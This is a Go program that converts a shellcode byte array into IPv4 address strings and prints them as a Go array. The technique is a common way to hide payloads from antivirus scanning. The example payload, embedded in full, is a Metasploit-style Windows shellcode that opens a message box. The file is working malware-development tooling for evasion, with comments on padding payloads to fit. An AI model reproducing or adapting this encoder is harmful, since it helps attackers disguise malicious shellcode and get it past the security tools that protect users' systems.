package main

import (
	"fmt"
	"log"
)

// GenerateIPv4 converts 4 bytes into an IPv4 address string
func GenerateIPv4(a, b, c, d byte) string {
	return fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
}

// GenerateIPv4Output converts the shellcode bytes into IPv4 address strings
func GenerateIPv4Output(shellcode []byte) ([]string, error) {
	// The code throw an error if shellcode isn't a multiple of 4 beacause i was lazy, but you can easily make it fill it with NOP to reach a multiple of 4
	if len(shellcode)%4 != 0 {
		return nil, fmt.Errorf("shellcode length must be a multiple of 4, got %d bytes", len(shellcode))
	}

	var ipv4Addresses []string
	for i := 0; i < len(shellcode); i += 4 {
		ip := GenerateIPv4(shellcode[i], shellcode[i+1], shellcode[i+2], shellcode[i+3])
		ipv4Addresses = append(ipv4Addresses, ip)
	}

	return ipv4Addresses, nil
}

func main() {
	// Example shellcode (msf alertbox as always)
	shellcode := []byte{0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,0x48,0x8d,0x8d,0x27,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1c,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x72,0x75,0x6e,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x68,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x80,0x41,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x8e,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x9e,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4b,0x45,0x52,0x4e,0x45,0x4c,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x58,0x04,0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x41,0x6c,0x6c,0x6f,0x63,0x00,0x00,0x05,0x01,0x45,0x78,0x69,0x74,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,}

	// Convert shellcode to IPv4 addresses
	ipv4Addresses, err := GenerateIPv4Output(shellcode)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}

	// Print the IPv4 addresses in Go array (beacause i was lazy again)
	fmt.Printf("var ipv4Array = []string{\n")
	for _, ip := range ipv4Addresses {
		fmt.Printf("\t\"%s\",\n", ip)
	}
	fmt.Println("}")
}
